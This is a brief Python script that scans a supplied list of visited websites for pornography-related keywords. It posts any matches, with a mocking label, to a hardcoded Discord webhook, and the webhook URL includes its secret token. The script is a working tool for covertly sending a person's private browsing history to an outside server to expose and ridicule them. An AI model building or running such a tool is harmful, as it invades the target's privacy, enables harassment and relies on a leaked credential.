import requests

# List of adult-related keywords (expand this list as needed)
adult_keywords = [
    "porn", "adult", "sex", "xxx", "pornhub", "xvideos", "redtube", "tube8", "youporn"
]

# Replace this with how you retrieve the actual browsing history (could be from a file or database)
websites_visited = [
    # Put your actual websites or history data here
]

# Function to search for adult keywords in the URLs
def search_adult_keywords(websites, keywords):
    found_sites = []
    for site in websites:
        if any(keyword.lower() in site.lower() for keyword in keywords):
            found_sites.append(site)
    return found_sites

# Search for the adult-related keywords
found_adult_sites = search_adult_keywords(websites_visited, adult_keywords)

# Your Discord webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1320743687109476393/03lSr_qHl0gJyrBWxBRg1uzLwTdwnWhp0p-mM-AWlaHxqn5bbL3ALjfVZUkiV01ReXee"

# Prepare the message
if found_adult_sites:
    message = "Adult websites found:\n" + "\n".join(found_adult_sites) + "\nThis dude is a gooner."
else:
    message = "No adult websites found. This guy is safe."

# Prepare the payload for the webhook
data = {
    "content": message
}

# Ensure the message is under 2000 characters
if len(message) > 2000:
    # Split the message into smaller chunks if it exceeds the limit
    chunks = [message[i:i+2000] for i in range(0, len(message), 2000)]
    
    # Send each chunk separately
    for chunk in chunks:
        response = requests.post(WEBHOOK_URL, json={"content": chunk})
        if response.status_code != 204:
            print(f"Failed to send chunk: {response.status_code}")
else:
    # Send the message normally if it's within the limit
    response = requests.post(WEBHOOK_URL, json=data)
    if response.status_code != 204:
        print(f"Failed to send message: {response.status_code}")
